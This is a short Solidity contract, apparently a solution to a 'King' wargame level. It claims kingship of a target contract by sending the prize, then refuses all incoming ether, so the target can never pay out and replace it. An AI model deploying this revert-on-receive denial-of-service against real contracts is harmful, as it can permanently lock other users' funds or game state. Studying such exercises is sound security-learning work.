// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

contract hackKing {
    // get the prize state var on remix or using ethers
    uint public prize = 1000000000000000 wei;
    constructor(address payable _target) payable {
      // send prize amount to this contract upon deployement
      require(msg.value == prize);
      // send the prize to _target
      (bool sent, ) = _target.call{value: prize}("");
      require(sent);
    }
    // no receive() or fallback() or any payable function
    // means every ether tx sent to this contract will revert
    /**
     * @note: user can use 
     * 1-selfdestruct() to force sent eth here
     * but that will destroy his contract and he could not claim kingship
     * since his contract is destroyed and no more exist
     * 2- target of mining reward
     * 3-Ether sent to the contract before the contract exists.(that's our prize we sent to contract)
     */
 
}